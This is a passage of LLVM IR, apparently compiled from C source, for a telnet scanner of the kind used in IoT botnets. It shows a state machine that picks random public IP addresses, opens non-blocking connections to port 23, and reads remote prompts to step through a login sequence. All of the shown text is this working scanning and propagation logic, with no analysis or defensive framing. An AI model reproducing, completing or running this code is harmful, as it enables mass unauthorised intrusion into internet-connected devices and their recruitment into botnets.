  call void @llvm.memset.p0i8.i64(i8* align 4 %29, i8 0, i64 8, i1 false)
  %30 = load i32, i32* %1, align 4
  %31 = zext i32 %30 to i64
  %32 = call i8* @llvm.stacksave()
  store i8* %32, i8** %9, align 8
  %33 = alloca %struct.telstate_t, i64 %31, align 16
  store i64 %31, i64* %10, align 8
  %34 = bitcast %struct.telstate_t* %33 to i8*
  %35 = load i32, i32* %1, align 4
  %36 = sext i32 %35 to i64
  %37 = mul i64 %36, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %34, i8 0, i64 %37, i1 false)
  store i32 0, i32* %2, align 4
  br label %38

38:                                               ; preds = %57, %23
  %39 = load i32, i32* %2, align 4
  %40 = load i32, i32* %1, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %60

42:                                               ; preds = %38
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias i8* @malloc(i64 noundef 1024) #12
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %56, i8 0, i64 1024, i1 false)
  br label %57

57:                                               ; preds = %42
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  br label %38, !llvm.loop !41

60:                                               ; preds = %38
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 5, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

63:                                               ; preds = %1089, %60
  br label %64

64:                                               ; preds = %63
  store i32 0, i32* %2, align 4
  br label %65

65:                                               ; preds = %1086, %64
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %1089

69:                                               ; preds = %65
  %70 = load i32, i32* %2, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %71
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %72, i32 0, i32 2
  %74 = load i8, i8* %73, align 8
  %75 = zext i8 %74 to i32
  switch i32 %75, label %1085 [
    i32 0, label %76
    i32 1, label %233
    i32 2, label %395
    i32 3, label %571
    i32 4, label %639
    i32 5, label %776
    i32 6, label %844
    i32 7, label %988
    i32 8, label %1016
  ]

76:                                               ; preds = %69
  %77 = load i32, i32* %2, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %79, i32 0, i32 8
  %81 = load i8*, i8** %80, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %81, i8 0, i64 1024, i1 false)
  %82 = load i32, i32* %2, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 3
  %86 = load i8, i8* %85, align 1
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %88, label %108

88:                                               ; preds = %76
  %89 = load i32, i32* %2, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %90
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %91, i32 0, i32 8
  %93 = load i8*, i8** %92, align 8
  store i8* %93, i8** %12, align 8
  %94 = load i32, i32* %2, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %95
  %97 = bitcast %struct.telstate_t* %96 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %97, i8 0, i64 32, i1 false)
  %98 = load i8*, i8** %12, align 8
  %99 = load i32, i32* %2, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %100
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %101, i32 0, i32 8
  store i8* %98, i8** %102, align 8
  %103 = call i32 @getRandomPublicIP()
  %104 = load i32, i32* %2, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %105
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %106, i32 0, i32 1
  store i32 %103, i32* %107, align 4
  br label %147

108:                                              ; preds = %76
  %109 = load i32, i32* %2, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %111, i32 0, i32 5
  %113 = load i8, i8* %112, align 1
  %114 = add i8 %113, 1
  store i8 %114, i8* %112, align 1
  %115 = load i32, i32* %2, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %117, i32 0, i32 5
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i64
  %121 = icmp eq i64 %120, 14
  br i1 %121, label %122, label %133

122:                                              ; preds = %108
  %123 = load i32, i32* %2, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 5
  store i8 0, i8* %126, align 1
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 4
  %131 = load i8, i8* %130, align 2
  %132 = add i8 %131, 1
  store i8 %132, i8* %130, align 2
  br label %133

133:                                              ; preds = %122, %108
  %134 = load i32, i32* %2, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = zext i8 %138 to i64
  %140 = icmp eq i64 %139, 6
  br i1 %140, label %141, label %146

141:                                              ; preds = %133
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 3
  store i8 1, i8* %145, align 1
  br label %1086

146:                                              ; preds = %133
  br label %147

147:                                              ; preds = %146, %88
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %148, align 4
  %149 = call zeroext i16 @htons(i16 noundef zeroext 23) #15
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %149, i16* %150, align 2
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %152 = getelementptr inbounds [8 x i8], [8 x i8]* %151, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %152, i8 0, i64 8, i1 false)
  %153 = load i32, i32* %2, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %159 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %158, i32 0, i32 0
  store i32 %157, i32* %159, align 4
  %160 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 0
  store i32 %160, i32* %164, align 16
  %165 = load i32, i32* %2, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %166
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %167, i32 0, i32 0
  %169 = load i32, i32* %168, align 16
  %170 = bitcast %struct.timeval* %11 to i8*
  %171 = call i32 @setsockopt(i32 noundef %169, i32 noundef 1, i32 noundef 20, i8* noundef %170, i32 noundef 16) #12
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 16
  %177 = bitcast %struct.timeval* %11 to i8*
  %178 = call i32 @setsockopt(i32 noundef %176, i32 noundef 1, i32 noundef 21, i8* noundef %177, i32 noundef 16) #12
  %179 = load i32, i32* %2, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 0
  %183 = load i32, i32* %182, align 16
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %186

185:                                              ; preds = %147
  br label %1086

186:                                              ; preds = %147
  %187 = load i32, i32* %2, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 16
  %192 = load i32, i32* %2, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = call i32 (i32, i32, ...) @fcntl(i32 noundef %196, i32 noundef 3, i8* noundef null)
  %198 = or i32 %197, 2048
  %199 = call i32 (i32, i32, ...) @fcntl(i32 noundef %191, i32 noundef 4, i32 noundef %198)
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %206 = call i32 @connect(i32 noundef %204, %struct.sockaddr* noundef %205, i32 noundef 16)
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %208, label %223

208:                                              ; preds = %186
  %209 = call i32* @__errno_location() #15
  %210 = load i32, i32* %209, align 4
  %211 = icmp ne i32 %210, 115
  br i1 %211, label %212, label %223

212:                                              ; preds = %208
  %213 = load i32, i32* %2, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = call i32 @sclose(i32 noundef %217)
  %219 = load i32, i32* %2, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 3
  store i8 1, i8* %222, align 1
  br label %232

223:                                              ; preds = %208, %186
  %224 = load i32, i32* %2, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 2
  store i8 1, i8* %227, align 8
  %228 = load i32, i32* %2, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 6
  store i32 0, i32* %231, align 4
  br label %232

232:                                              ; preds = %223, %212
  br label %1085

233:                                              ; preds = %69
  %234 = load i32, i32* %2, align 4
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %235
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %236, i32 0, i32 6
  %238 = load i32, i32* %237, align 4
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %246

240:                                              ; preds = %233
  %241 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %242 = load i32, i32* %2, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %243
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %244, i32 0, i32 6
  store i32 %241, i32* %245, align 4
  br label %246

246:                                              ; preds = %240, %233
  br label %247

247:                                              ; preds = %246
  store %struct.__sigset_t* %4, %struct.__sigset_t** %14, align 8
  store i32 0, i32* %13, align 4
  br label %248

248:                                              ; preds = %258, %247
  %249 = load i32, i32* %13, align 4
  %250 = zext i32 %249 to i64
  %251 = icmp ult i64 %250, 16
  br i1 %251, label %252, label %261

252:                                              ; preds = %248
  %253 = load %struct.__sigset_t*, %struct.__sigset_t** %14, align 8
  %254 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %253, i32 0, i32 0
  %255 = load i32, i32* %13, align 4
  %256 = zext i32 %255 to i64
  %257 = getelementptr inbounds [16 x i64], [16 x i64]* %254, i64 0, i64 %256
  store i64 0, i64* %257, align 8
  br label %258

258:                                              ; preds = %252
  %259 = load i32, i32* %13, align 4
  %260 = add i32 %259, 1
  store i32 %260, i32* %13, align 4
  br label %248, !llvm.loop !42

261:                                              ; preds = %248
  br label %262

262:                                              ; preds = %261
  br label %263

263:                                              ; preds = %262
  %264 = load i32, i32* %2, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %265
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %266, i32 0, i32 0
  %268 = load i32, i32* %267, align 16
  %269 = srem i32 %268, 64
  %270 = zext i32 %269 to i64
  %271 = shl i64 1, %270
  %272 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %273 = load i32, i32* %2, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %274
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %275, i32 0, i32 0
  %277 = load i32, i32* %276, align 16
  %278 = sdiv i32 %277, 64
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds [16 x i64], [16 x i64]* %272, i64 0, i64 %279
  %281 = load i64, i64* %280, align 8
  %282 = or i64 %281, %271
  store i64 %282, i64* %280, align 8
  %283 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %283, align 8
  %284 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %284, align 8
  %285 = load i32, i32* %2, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %286
  %288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 16
  %290 = add nsw i32 %289, 1
  %291 = call i32 @select(i32 noundef %290, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %4, %struct.__sigset_t* noundef null, %struct.timeval* noundef %5)
  store i32 %291, i32* %3, align 4
  %292 = load i32, i32* %3, align 4
  %293 = icmp eq i32 %292, 1
  br i1 %293, label %294, label %351

294:                                              ; preds = %263
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %295 = load i32, i32* %2, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %296
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 16
  %300 = bitcast i32* %7 to i8*
  %301 = call i32 @getsockopt(i32 noundef %299, i32 noundef 1, i32 noundef 4, i8* noundef %300, i32* noundef %6) #12
  %302 = load i32, i32* %7, align 4
  %303 = icmp ne i32 %302, 0
  br i1 %303, label %304, label %319

304:                                              ; preds = %294
  %305 = load i32, i32* %2, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %306
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %307, i32 0, i32 0
  %309 = load i32, i32* %308, align 16
  %310 = call i32 @sclose(i32 noundef %309)
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 2
  store i8 0, i8* %314, align 8
  %315 = load i32, i32* %2, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %316
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %317, i32 0, i32 3
  store i8 1, i8* %318, align 1
  br label %350

319:                                              ; preds = %294
  %320 = load i32, i32* %2, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 16
  %325 = load i32, i32* %2, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %326
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %327, i32 0, i32 0
  %329 = load i32, i32* %328, align 16
  %330 = call i32 (i32, i32, ...) @fcntl(i32 noundef %329, i32 noundef 3, i8* noundef null)
  %331 = and i32 %330, -2049
  %332 = call i32 (i32, i32, ...) @fcntl(i32 noundef %324, i32 noundef 4, i32 noundef %331)
  %333 = load i32, i32* %2, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %334
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %335, i32 0, i32 6
  store i32 0, i32* %336, align 4
  %337 = load i32, i32* %2, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 7
  store i16 0, i16* %340, align 16
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 8
  %345 = load i8*, i8** %344, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %345, i8 0, i64 1024, i1 false)
  %346 = load i32, i32* %2, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %347
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %348, i32 0, i32 2
  store i8 2, i8* %349, align 8
  br label %1086

350:                                              ; preds = %304
  br label %370

351:                                              ; preds = %263
  %352 = load i32, i32* %3, align 4
  %353 = icmp eq i32 %352, -1
  br i1 %353, label %354, label %369

354:                                              ; preds = %351
  %355 = load i32, i32* %2, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 0
  %359 = load i32, i32* %358, align 16
  %360 = call i32 @sclose(i32 noundef %359)
  %361 = load i32, i32* %2, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %362
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %363, i32 0, i32 2
  store i8 0, i8* %364, align 8
  %365 = load i32, i32* %2, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 3
  store i8 1, i8* %368, align 1
  br label %369

369:                                              ; preds = %354, %351
  br label %370

370:                                              ; preds = %369, %350
  %371 = load i32, i32* %2, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %372
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %373, i32 0, i32 6
  %375 = load i32, i32* %374, align 4
  %376 = add i32 %375, 5
  %377 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %378 = icmp ult i32 %376, %377
  br i1 %378, label %379, label %394

379:                                              ; preds = %370
  %380 = load i32, i32* %2, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 0
  %384 = load i32, i32* %383, align 16
  %385 = call i32 @sclose(i32 noundef %384)
  %386 = load i32, i32* %2, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 2
  store i8 0, i8* %389, align 8
  %390 = load i32, i32* %2, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 3
  store i8 1, i8* %393, align 1
  br label %394

394:                                              ; preds = %379, %370
  br label %1085

395:                                              ; preds = %69
  %396 = load i32, i32* %2, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 6
  %400 = load i32, i32* %399, align 4
  %401 = icmp eq i32 %400, 0
  br i1 %401, label %402, label %408

402:                                              ; preds = %395
  %403 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %404 = load i32, i32* %2, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %405
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %406, i32 0, i32 6
  store i32 %403, i32* %407, align 4
  br label %408

408:                                              ; preds = %402, %395
  %409 = load i32, i32* %2, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 8
  %413 = load i8*, i8** %412, align 8
  %414 = call i32 @matchPrompt(i8* noundef %413)
  %415 = icmp ne i32 %414, 0
  br i1 %415, label %416, label %421

416:                                              ; preds = %408
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 2
  store i8 7, i8* %420, align 8
  br label %421

421:                                              ; preds = %416, %408
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 16
  %427 = load i32, i32* %2, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %428
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %429, i32 0, i32 8
  %431 = load i8*, i8** %430, align 8
  %432 = load i32, i32* %2, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 7
  %436 = load i16, i16* %435, align 16
  %437 = zext i16 %436 to i32
  %438 = call i32 @readUntil(i32 noundef %426, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %431, i32 noundef 1024, i32 noundef %437)
  %439 = icmp ne i32 %438, 0
  br i1 %439, label %440, label %458

440:                                              ; preds = %421
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 6
  store i32 0, i32* %444, align 4
  %445 = load i32, i32* %2, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 7
  store i16 0, i16* %448, align 16
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 8
  %453 = load i8*, i8** %452, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %453, i8 0, i64 1024, i1 false)
  %454 = load i32, i32* %2, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 2
  store i8 3, i8* %457, align 8
  br label %1086

458:                                              ; preds = %421
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 0
  %463 = load i32, i32* %462, align 16
  %464 = load i32, i32* %2, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 8
  %468 = load i8*, i8** %467, align 8
  %469 = load i32, i32* %2, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 7
  %473 = load i16, i16* %472, align 16
  %474 = zext i16 %473 to i32
  %475 = call i32 @readUntil(i32 noundef %463, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %468, i32 noundef 1024, i32 noundef %474)
  %476 = icmp ne i32 %475, 0
  br i1 %476, label %477, label %495

477:                                              ; preds = %458
  %478 = load i32, i32* %2, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %479
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %480, i32 0, i32 6
  store i32 0, i32* %481, align 4
  %482 = load i32, i32* %2, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %484, i32 0, i32 7
  store i16 0, i16* %485, align 16
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 8
  %490 = load i8*, i8** %489, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %490, i8 0, i64 1024, i1 false)
  %491 = load i32, i32* %2, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %492
